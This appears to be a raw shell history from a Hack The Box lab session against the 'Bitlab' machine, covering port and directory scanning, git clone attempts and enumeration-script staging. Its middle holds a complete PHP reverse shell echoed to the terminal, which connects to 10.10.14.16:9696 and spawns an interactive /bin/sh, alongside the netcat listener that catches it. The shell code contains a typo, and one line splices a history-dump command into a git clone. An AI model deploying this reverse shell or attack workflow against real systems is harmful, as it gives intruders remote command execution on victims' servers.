nmap -sC -sV -oA nmap/Bitlab 10.10.10.114
ping 10.10.10.157
tmux new -s HTB
fc -R '/root/.tmux/resurrect/zsh_history-HTB:2.0'; clear
fc -R '/root/.tmux/resurrect/zsh_history-HTB:4.0'; clear
fc -R '/root/.tmux/resurrect/zsh_history-HTB:4.1'; clear
fc -R '/root/.tmux/resurrect/zsh_history-HTB:4.2'; clear
vim sqlite.php
openvpn ../../VPN/vGsec
cd ../Bitlab
nmap -sC -sV -oA nmap/Bitlab 10.10.10.114
ping 10.10.10.114
vim /etc/hosts
ls
gobuster
md gobuster
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u gitlab.htb -t 50
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u gitlab.htb -t 50 -h
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u gitlab.htb -t 50 -b 302
ls
cd gobuster
ls
md exploit
ls
cd exploit
cp ../../Kryptos/crypt/exploit/shell.php .
ls
vim shell.php
nc -lvnp 9696
cat shell.php | xclip -sel c
echo <?php\n\nset_time_limit (0);\n$VERSION = "1.0";\n$ip = '10.10.14.16';  // CHANGE THIS\n$port = 9696;       // CHANGE THIS\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; /bin/sh -i';\n$daemon = 0;\n$debug = 0;\n\n//\n// Daemonise ourself if possible to avoid zombies later\n//\n\n// pcntl_fork is hardly ever available, but will allow us to daemonise\n// our php process and avoid zombies.  Worth a try...\nif (function_exists('pcntl_fork')) {\n\t// Fork and have the parent process exit\n\t$pid = pcntl_fork();\n\t\n\tif ($pid == -1) {\n\t\tprintit("ERROR: Can't fork");\n\t\texit(1);\n\t}\n\t\n\tif ($pid) {\n\t\texit(0);  // Parent exits\n\t}\n\n\t// Make the current process a session leader\n\t// Will only succeed if we forked\n\tif (posix_setsid() == -1) {\n\t\tprintit("Error: Can't setsid()");\n\t\texit(1);\n\t}\n\n\t$daemon = 1;\n} else {\n\tprintit("WARNING: Failed to daemonise.  This is quite common and not fatal.");\n}\n\n// Change to a safe directory\nchdir("/");\n\n// Remove any umask we inherited\numask(0);\n\n//\n// Do the reverse shell...\n//\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (csock) {\n\tprintit("$errstr ($errno)");\n\texit(1);\n}\n\n// Spawn shell process\n$descriptorspec = array(\n   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from\n   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to\n   2 => array("pipe", "w")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n\tprintit("ERROR: Can't spawn shell");\n\texit(1);\n}\n\n// Set everything to non-blocking\n// Reason: Occsionally reads will block, even though stream_select tells us they won't\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit("Successfully opened reverse shell to $ip:$port");\n\nwhile (1) {\n\t// Check for end of TCP connection\n\tif (feof($sock)) {\n\t\tprintit("ERROR: Shell connection terminated");\n\t\tbreak;\n\t}\n\n\t// Check for end of STDOUT\n\tif (feof($pipes[1])) {\n\t\tprintit("ERROR: Shell process terminated");\n\t\tbreak;\n\t}\n\n\t// Wait until a command is end down $sock, or some\n\t// command output is available on STDOUT or STDERR\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\n\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n\t// If we can read from the TCP socket, send\n\t// data to process's STDIN\n\tif (in_array($sock, $read_a)) {\n\t\tif ($debug) printit("SOCK READ");\n\t\t$input = fread($sock, $chunk_size);\n\t\tif ($debug) printit("SOCK: $input");\n\t\tfwrite($pipes[0], $input);\n\t}\n\n\t// If we can read from the process's STDOUT\n\t// send data down tcp connection\n\tif (in_array($pipes[1], $read_a)) {\n\t\tif ($debug) printit("STDOUT READ");\n\t\t$input = fread($pipes[1], $chunk_size);\n\t\tif ($debug) printit("STDOUT: $input");\n\t\tfwrite($sock, $input);\n\t}\n\n\t// If we can read from the process's STDERR\n\t// send data down tcp connection\n\tif (in_array($pipes[2], $read_a)) {\n\t\tif ($debug) printit("STDERR READ");\n\t\t$input = fread($pipes[2], $chunk_size);\n\t\tif ($debug) printit("STDERR: $input");\n\t\tfwrite($sock, $input);\n\t}\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\n// Like print, but does nothing if we've daemonised ourself\n// (I can't figure out how to redirect STDOUT like a proper daemon)\nfunction printit ($string) {\n\tif (!$daemon) {\n\t\tprint "$string\n";\n\t}\n}\n\n?> \n
stty raw -echo ;fg
ping gitlab.htb
ping 10.10.10.157
md www
cd www
ls
cp /opt/t00lz/enum/Linux/linPE/linpe.sh .
python3 -m http.server 80
cd ..
md enum
ls
mv enum user_enum
cd user_enum
curl gitlab.htb:9999/linpe.txt -o linpe.txt
ls
cd ..
ls
md repo ; cd rpo
md repo ; cd repo
git clone http://10.10.10.114/root/profile.git
git clone http://10.10.10.114/root/profile
git clone 10.10.10.114/root/profile
git clone https://10.10.10.114/root/profile
git clone https://10.10.10.114/root/profile.git
git clone clave@gitlab.htb:root/profile.git
git clone git://10.10.10.114/root/profile
ls
ls -la
git clone git://10.10.10.114/root/profile fc -lLn -64 > '/root/.tmux/resurrect/zsh_history-HTB:3.0'
ls
git clone http://10.10.10.114/root/deployer
git clone git://10.10.10.114/root/deployer
curl http://10.10.10.114/root/deployer
